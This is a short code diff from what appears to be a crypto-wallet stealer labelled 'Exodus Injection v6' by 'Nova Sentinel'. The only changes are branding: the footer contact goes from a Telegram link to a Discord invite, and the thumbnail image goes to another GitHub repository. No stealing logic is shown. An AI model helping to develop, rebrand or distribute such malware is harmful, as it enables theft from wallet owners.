@@ -1653,7 +1653,7 @@ const { fstatSync } = require("fs"),
         const embed = {
           color: 3553599,
           footer: {
-            text: "@Nova Sentinel | https://t.me/Sordeal",
+            text: "@Nova Sentinel | discord.gg/airshop",
           },
           title: "Exodus Injection v6",
           fields: [
@@ -1665,7 +1665,7 @@ const { fstatSync } = require("fs"),
           ],
 
           thumbnail: {
-            url: `https://raw.githubusercontent.com/ksch-58/sub/main/assets/gifnova.gif`,
+            url: `https://raw.githubusercontent.com/selfbot12345/inject/main/assets/gifnova.gif`,
           },
         };
         const message = {
